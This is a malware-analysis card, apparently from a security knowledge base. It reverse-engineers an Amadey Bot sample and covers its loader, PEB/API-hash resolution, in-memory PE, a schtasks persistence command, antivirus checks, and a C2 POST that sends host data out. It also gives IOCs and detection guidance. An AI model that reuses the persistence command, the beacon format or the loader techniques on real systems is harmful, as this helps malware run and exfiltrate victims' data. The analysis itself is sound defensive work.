---
id: code-analysis-reverse-windows-amadey-api-hash-loader-c2-config
title: Amadey Bot 样本分析：CAB 自解压 + PEB/API hash 解析 + 内存 PE 落地 oneetx.exe + 计划任务持久化与 C2 外带
type: scenario
domain: code-analysis
path: code-analysis/reverse/windows
technique: amadey-api-hash-loader-c2-analysis
aliases:
- Amadey Bot
- Amadey 样本分析
- API hash 加载器
- oneetx.exe
- si684017.exe
- 77.91.124.207
- PlayS 章节 C2
tags:
- windows
- malware-analysis
- amadey
- api-hashing
- peb
- shellcode
- loader
- persistence
- c2
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V262
  verified_at: '2026-11-07T17:27:23+08:00'
  notes: V262 重核：对照正文与35图（缺12/33），CAB SFX 2文件、.data raw/virtual 差异、sub_4032E0 8字节填充、msimg32.dll、PEB fs:[30]、hash D5786/348BFA、kernel32 分块拼装、内存 PE(MZ)、4次导入填充、0x416025 跳转、595f021478/oneetx.exe、Startup+schtasks、互斥量0xB7、GetNativeSystemInfo=9、C2 77.91.124.207/plays/chapter/index.php 与 POST 参数均与原文/图一致；dedup 仅自匹配（本卡已入库），其余候选 new。未执行样本。
---

## 一句话结论

样本（SHA-256 `449d9e29d49dea9697c9a84bb7cc68b50343014d9e14667875a83cade9adbc60`）是 CAB 自解压的 Amadey Bot：`si684017.exe` 加载器用垃圾代码和 RWX 内存解密 shellcode，经 PEB 遍历 + 自定义 API hash 解析 `LoadLibraryA`/`GetProcAddress` 等函数，再解密出内存 PE 并落地为 `%TEMP%\<id>\oneetx.exe`；最终样本通过 Startup 注册表/每分钟计划任务持久化，收集主机、SID 与杀软信息后 POST 到 `http://77.91.124.207/plays/chapter/index.php`。

## 原理

- **样本结构**：外层是被 DIE 识别为 Microsoft Cabinet 的 SFX（2 个文件），解压得到 `si684017.exe` 与 `un007241.exe`。`si684017.exe` 为 32 位 PE，`.data` 节 raw size 与 virtual size 不一致，提示有运行时解压/注入；导入表包含文件、内存、进程快照等 API，判断为加载器。
- **加载器第一层**：入口执行大量垃圾代码（夹杂 `WritePrivateProfileStringA`、`CreateJobObjectA`、`GetVersionExW` 等）干扰分析；随后 `GlobalAlloc` 分配内存并 `VirtualProtect` 设为 `PAGE_EXECUTE_READWRITE`（0x40），用 `sub_4032E0` 每次 8 字节把解密结果填入新内存；再 `LoadLibraryA("msimg32.dll")` 后 `call` 跳入该内存执行 shellcode。
- **PEB 遍历与 API hash**：shellcode 通过 `fs:[0x30]` 取 PEB，`PEB->Ldr` 遍历模块，取 kernel32.dll 导出表；对每个导出名计算自定义 hash，与调用点传入的常量比较。调试确认 `LoadLibraryA` 对应 hash `D5786`、`GetProcAddress` 对应 `348BFA`。`kernel32.dll` 字符串被拆成三组小端序 DWORD 在栈上拼装，避免明文字符串被静态检出。
- **动态解析函数集**：先解析 `GlobalAlloc`/`GetLastError`/`Sleep`/`VirtualAlloc`/`CreateToolhelp32Snapshot`/`Module32First`/`CloseHandle`；随后用 `VirtualAlloc` 分配新内存、转存上一段内容，再解析 `LoadLibraryA`/`VirtualAlloc`/`VirtualProtect`/`VirtualFree`/`GetVersionExA`/`TerminateProcess`/`ExitProcess`/`SetErrorMode`。`GetVersionExA` 判断系统低于 Windows Vista 则退出。
- **内存 PE**：继续 `VirtualAlloc` 分配新内存，把此前内存中的特定内容处理成完整 PE（内存中出现 `MZ` 与 "This program cannot be run in DOS mode"），并写入 `si684017.exe` 的地址空间（关键跳转 0x416025）；随后分四次把 kernel32/advapi32/wininet 的函数地址填入 PE 的导入位置，跳到 0x416025 执行。
- **落地与执行**：payload 读取环境变量，用 `4141F0` + `4029B0` 两个自定义解密函数解出字符串 `595f021478` 与 `oneetx.exe`；在 `%TEMP%\595f021478\` 写入 `oneetx.exe`，通过 `ShellExecuteA` 创建执行。`oneetx.exe` 是原始样本加载新恶意内容后的程序。
- **持久化**：payload 以 `KEY_ALL_ACCESS` 打开 `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`，把当前恶意程序路径写入 Startup；同时通过 `ShellExecuteA` 执行 `schtasks /Create /SC MINUTE /MO 1 /TN si684017.exe /TR "<当前进程绝对路径>" /F`，每分钟自启。
- **主机与杀软信息**：`GetNativeSystemInfo` 返回值 9 表示 `PROCESSOR_ARCHITECTURE_AMD64`；读取 `CurrentBuild`、`ComputerName`、`UserName`、主机 SID；通过检查 `ProgramData\` 下 `AVAST Software`、`Avira`、`Kaspersky Lab`、`ESET`、`Panda Security`、`Doctor Web`、`AVG`、`360TotalSecurity`、`Bitdefender`、`Norton`、`Sophos`、`Comodo` 等目录判断杀软，拼接成 `&id=...&vs=3.70&sd=b50502&os=1&bi=1&ar=1&pc=<host>&un=<user>&dm=&av=<n>&lv=0&og=1` 后 POST 到 C2。
- **字符串加密**：payload 中大量看似 Base64 的字符串（如 `Eq1qHH==`、`NTk1ZjAyMTQ3OA==`）Base64 解码后是乱码，说明不是标准 Base64；实际由 `4141F0` 与 `4029B0` 组合的自定义算法解密，需要动态跟踪或还原算法才能批量提取配置。
- **反分析**：创建互斥量后检查 `GetLastError()==0xB7`（183，`ERROR_ALREADY_EXISTS`），已存在则退出；另有 `test bl,bl` 分支需把 `bl` 改为 1 才能继续。动态分析需 patch 这两处。

## 触发条件

- 具备样本文件与隔离的 Windows 分析环境（x32dbg/IDA/PE 工具、CAB 解压工具）。
- 允许运行样本进行动态调试（建议断网/快照/沙箱）；网络行为分析需要可控的出网与 DNS/HTTP 记录。
- 需要识别 API hash 与字符串解密时，具备 PEB/导出表基础与 x32dbg 条件断点能力。
- 分析目标是提取加载器行为、持久化方式、C2 地址与主机指纹字段，而非利用某个漏洞。

## 利用步骤

1. 样本识别：计算 SHA-256，`DIE`/`file` 确认 CAB SFX；用 `cabextract`/7-Zip 解出 `si684017.exe`、`un007241.exe`。
2. 静态初查：PE 节表看 `.data` raw/virtual 差异、导入表（GlobalAlloc/VirtualAlloc/VirtualProtect/LoadLibrary/GetProcAddress 等）、字符串与熵；IDA 标记垃圾代码块。
3. 动态跟踪加载器：x32dbg 在 `GlobalAlloc`、`VirtualProtect`、`LoadLibraryA`、`GetProcAddress` 下条件断点，记录参数与返回地址，确认 RWX 分配与 API 解析。
4. 分析 API hash：在 shellcode 的 PEB 遍历/hash 循环处断下，记录比较常量（案例 `D5786`→LoadLibraryA、`348BFA`→GetProcAddress）；可用条件日志输出函数名与 hash，建立映射表。
5. dump 内存 PE：在最后一次 `VirtualAlloc`/解密完成后，从 `MZ` 头 dump 新内存；用 PE 工具修复/映射后做静态分析（导入表、字符串解密函数、网络/注册表/计划任务 API）。
6. 处理反分析：把 `test bl,bl` 后的 `bl` 改为 1；在互斥量检查处把 `GetLastError` 返回值/`eax` 改成非 0xB7（如 0）继续；必要时跳过 `GetVersionExA` 版本检查。
7. 还原字符串：跟踪 `4141F0` + `4029B0`，或对已知明文/密文对做算法逆推；批量解出 C2 URL、注册表路径、schtasks 参数、AV 目录列表。
8. 观察持久化与 C2：确认 Startup 注册表写入、`schtasks /Create /SC MINUTE /MO 1`，抓取 POST 到 `http://77.91.124.207/plays/chapter/index.php` 的完整参数与 `Content-Type: application/x-www-form-urlencoded`。
9. 提取 IOC：样本 hash、互斥量 `006700e5a2ab05704bbb0c589b88924d`、C2 `77.91.124.207`、路径 `/plays/chapter/index.php`、落地 `%TEMP%\<id>\oneetx.exe`、计划任务名 `si684017.exe`。

## PoC

```text
# 样本
SHA-256: 449d9e29d49dea9697c9a84bb7cc68b50343014d9e14667875a83cade9adbc60
类型: 32-bit PE / Microsoft Cabinet SFX（2 files）
释放: si684017.exe（加载器）、un007241.exe

# 关键 API hash（文章调试结果）
LoadLibraryA   -> D5786
GetProcAddress -> 348BFA

# 反分析 patch
1) test bl,bl 分支：把 bl 改为 1
2) 互斥量检查：GetLastError()==0xB7(183) 则退出；把 eax 改为非 0xB7

# 持久化
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\Startup = <当前样本路径>
schtasks /Create /SC MINUTE /MO 1 /TN si684017.exe /TR "<当前进程绝对路径>" /F

# C2（案例测试环境）
POST http://77.91.124.207/plays/chapter/index.php
Content-Type: application/x-www-form-urlencoded
&id=667007790723&vs=3.70&sd=b50502&os=1&bi=1&ar=1&pc=DESKTOP-534ND1J&un=Malware_10&dm=&av=13&lv=0&og=1

# 互斥量
006700e5a2ab05704bbb0c589b88924d
```

## 变体与关联

- API hash 算法分析与批量还原：`code-analysis-reverse-obfuscation-dridex-api-hash-crc32-xor-key`（Dridex 的 `crc32(name)^0x7AF3DA47` 与 HashDB）；本条是自定义 hash + 动态条件断点，常量与样本不同。
- PEB/Ldr 导出表动态解析：`pentest-c2-peb-ldr-export-dynamic-api-resolution`；本条额外有垃圾代码、RWX 解密和内存 PE 落地。
- 内存 PE/壳式加载：`code-analysis-reverse-unpacking-*`、`pentest-c2-pic-shellcode-text-peb-eat-http-loader`。
- 持久化：Startup 注册表 + `schtasks` 每分钟任务；检测侧可参考 `defense-incident-response-windows-persistence-triage-run-schtask-service`。
- 字符串加密类似 Base64 但非标准：不要直接 CyberChef Base64 解码，需跟踪自定义解密函数。

## 检测与防御

- IOC 检测：样本 SHA-256、互斥量 `006700e5a2ab05704bbb0c589b88924d`、C2 `77.91.124.207` 与 `/plays/chapter/index.php`、计划任务名 `si684017.exe`、`%TEMP%\<随机id>\oneetx.exe`。
- 行为检测：进程创建 `schtasks /Create /SC MINUTE /MO 1`、写 `User Shell Folders\Startup`、读取 `ProgramData\` 下多家杀软目录、向固定 IP 发送带 `id/vs/sd/os/bi/ar/pc/un/dm/av/lv/og` 字段的 POST。
- 内存检测：查找 RWX 区域、PEB 遍历 + 导出名 hash 循环、无磁盘来源的 PE 内存模块；结合 YARA 规则匹配 API hash 常量与字符串解密函数特征。
- 防御：限制普通用户写 Startup/创建计划任务，启用 AMSI/EDR 与网络出站白名单；对 CAB SFX 附件与未知 PE 做沙箱分析；及时隔离感染主机并清理持久化项。
